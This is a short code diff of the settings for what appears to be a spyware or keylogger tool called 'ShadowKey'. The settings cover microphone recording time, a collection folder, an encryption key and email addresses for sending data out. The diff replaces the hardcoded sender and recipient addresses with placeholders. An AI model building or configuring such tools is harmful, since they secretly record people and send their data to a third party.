@@ -56,9 +56,9 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "alt.s4-5yu6wkb@yopmail.com"
+email_address = "add_temp_mail"
 password = "no_password_needed"
-toaddr = "ghostphreaksec@gmail.com"
+toaddr = "add_email"
 username = getpass.getuser()
 key = "C0DcvpYhOHDzR4ybk5S8fYIjf7axzR6gxWP5ervjXGo="
 file_path = os.path.expanduser("~/Documents/ShadowKey/Files")
